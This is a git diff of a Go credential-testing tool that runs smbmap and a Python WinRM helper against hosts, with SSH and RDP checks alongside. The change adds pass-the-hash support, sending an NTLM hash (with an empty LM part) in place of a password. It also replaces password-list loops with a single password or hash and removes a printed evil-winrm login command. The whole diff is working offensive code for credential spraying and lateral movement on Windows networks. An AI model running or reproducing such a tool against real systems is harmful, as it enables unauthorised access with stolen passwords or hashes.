@@ -16,44 +16,55 @@ import (
 
 var consoleMutex sync.Mutex
 
-func checkSMB(username string, password string, host string, domain string, passwordCounter string) bool {
+func checkSMB(username string, secret string, host string, domain string, passwordCounter string, useHash bool) bool {
 	// Construct the smbmap command
 	var cmdArgs []string
-	cmdArgs = append(cmdArgs, "-u", username, "-p", password, "-H", host)
+	cmdArgs = append(cmdArgs, "-u", username)
+	cmdArgs = append(cmdArgs, "-H", host) // Host flag
 
 	// Conditionally include the domain if it's provided
 	if domain != "" {
 		cmdArgs = append(cmdArgs, "-d", domain)
 	}
 
+	// Append the password or hash to the command arguments
+	if useHash {
+		// Prepend the empty LM hash part to the NTLM hash
+		cmdArgs = append(cmdArgs, "-p", "00000000000000000000000000000000:"+secret)
+	} else {
+		cmdArgs = append(cmdArgs, "-p", secret) // Use password
+	}
+
 	cmd := exec.Command("smbmap", cmdArgs...)
-	// Redirect the standard output and error to capture the command's output
 	var out bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &out
 
 	// Run the smbmap command
 	err := cmd.Run()
-
-	if err != nil {
-		fmt.Printf("Failed SMB on %s with %s/%s: %s\n", host, username, password, out.String())
-		return false
-	}
+	outputStr := out.String()
 
 	consoleMutex.Lock()
-	fmt.Printf("\r%100s", "") // Print 100 spaces (adjust the number as needed)
-	fmt.Printf("\r\033[33mTesting password #%s: \033[31m%s\033[0m on %s with username \033[31m%s\033[0m", passwordCounter, password, host, username)
-	os.Stdout.Sync()
-	consoleMutex.Unlock()
-	result := extractSMBMapResult(out.String())
-	if strings.Contains(result, "Authentication failed") {
-		// If you want to print a line break after a failed attempt, uncomment the next line
-		// fmt.Println()
+	defer consoleMutex.Unlock()
+
+	if err != nil {
+		fmt.Printf("Failed to run SMBMap command on %s with %s/%s: %s\n", host, username, secret, outputStr)
 		return false
 	}
 
-	fmt.Printf("\n\033[34mYou are connected to SMB on port 445 with credentials: %s : %s\033[0m\n", username, password)
-	fmt.Println(result)
+	// Use the output to extract the result
+	smbResult := extractSMBMapResult(outputStr)
+	if strings.Contains(smbResult, "Authentication failed") || strings.Contains(outputStr, "STATUS_LOGON_FAILURE") {
+		fmt.Printf("\033[31mAuthentication failed for user #%s with %s using %s on %s\033[0m\n", passwordCounter, username, secret, host)
+		return false
+	} else if strings.Contains(smbResult, "READ,WRITE") || strings.Contains(smbResult, "READ ONLY") {
+		fmt.Printf("\033[34mSuccessfully authenticated #%s with %s on %s with READ or WRITE access\033[0m\n", passwordCounter, username, host)
+	} else {
+		fmt.Printf("\033[33mSuccessfully authenticated #%s with %s on %s but no useful access was found\033[0m\n", passwordCounter, username, host)
+	}
+
+	// Print the full smbmap output if needed for debugging or further information
+	// fmt.Println(outputStr)
 
 	return true
 }
@@ -138,31 +149,41 @@ func checkSSH(username, password, host string) bool {
 	fmt.Printf("\033[34mSuccess SSH on %s with %s/%s\033[0m\n", host, username, password)
 	return true
 }
-func checkWinRM(username, password, host string) bool {
-	// Construct the command to run the Python script
-	cmd := exec.Command("python", "winrm_check.py", host, username, password)
 
-	// Capture the output of the Python script
+func checkWinRM(username, secret, host string, useHash bool) bool {
+	// Construct the command to run the Python script
+	var cmdArgs []string
+	cmdArgs = append(cmdArgs, "python", "winrm_check.py", host, username)
+
+	// Append the password or hash to the command arguments
+	if useHash {
+		cmdArgs = append(cmdArgs, "-hash", secret)
+	} else {
+		cmdArgs = append(cmdArgs, "-password", secret)
+	}
+
+	// Execute the Python script
+	cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
 	output, err := cmd.CombinedOutput()
+	outputStr := string(output)
+
 	if err != nil {
-		fmt.Printf("Failed WinRM on %s with %s/%s: %s\n", host, username, password, output)
+		fmt.Printf("Failed WinRM on %s with %s/%s: %s\n", host, username, secret, outputStr)
 		return false
 	}
 
-	if err != nil {
-		// handle error
-	} else {
-		fmt.Printf("\033[34mSuccess WinRM on %s with %s/%s\033[0m\n", host, username, password)
-
-		// Construct the command you intend to execute
-		command := fmt.Sprintf("evil-winrm -i %s -u %s -p %s", host, username, password)
-
-		// Print the command for the user
-		fmt.Printf("Command to be executed: \033[32m%s\033[0m\n", command)
-
+	// Interpret the output from the Python script
+	if strings.Contains(outputStr, "Connection Success") {
+		fmt.Printf("\033[34mSuccess: Authentication succeeded on %s with %s/%s\033[0m\n", host, username, secret)
+		return true
+	} else if strings.Contains(outputStr, "Connection Failed") {
+		fmt.Printf("\033[31mConnection failed: Authentication failed on %s with %s/%s\033[0m\n", host, username, secret)
+		return false
 	}
 
-	return true
+	// Handle unknown or unexpected output
+	fmt.Printf("\033[33mConnection status unknown on %s with %s/%s: %s\033[0m\n", host, username, secret, outputStr)
+	return false
 }
 
 func checkRDP(username, password, host string) bool {
@@ -236,6 +257,9 @@ func main() {
 	flag.StringVar(&domain, "d", "", "Domain")
 	usernameFile := flag.String("uf", "", "Username file")
 	passwordFile := flag.String("pf", "", "Password file")
+	var singleHash string
+	flag.StringVar(&singleHash, "H", "", "NTLM hash")
+
 	passwordCounter := 0
 	flag.Parse()
 
@@ -288,10 +312,17 @@ func main() {
 
 		if isPortOpen(host, "445", 5*time.Second) {
 			for _, username := range usernames {
-				for _, password := range passwords {
-					passwordCounter++
-					checkSMB(username, password, host, domain, strconv.Itoa(passwordCounter))
+				passwordCounter++
+				// Determine if we're using a hash or password
+				useHash := singleHash != ""
+				secret := singlePassword
+				if useHash {
+					// Prepend the "empty" LM hash if we're using an NTLM hash
+					secret = singleHash
 				}
+
+				// Call checkSMB with the determined secret and useHash flag
+				checkSMB(username, secret, host, domain, strconv.Itoa(passwordCounter), useHash)
 			}
 		} else {
 			fmt.Printf("SMB port is closed on %s, skipping SMB check.\n", host)
@@ -319,9 +350,12 @@ func main() {
 
 		if isPortOpen(host, "5985", 5*time.Second) {
 			for _, username := range usernames {
-				for _, password := range passwords {
-					checkWinRM(username, password, host)
+				useHash := singleHash != "" // Determine if we're using a hash
+				secret := singlePassword
+				if useHash {
+					secret = singleHash // Use the hash
 				}
+				checkWinRM(username, secret, host, useHash)
 			}
 		} else {
 			fmt.Printf("WinRM port is closed on %s, skipping WinRM check.\n", host)
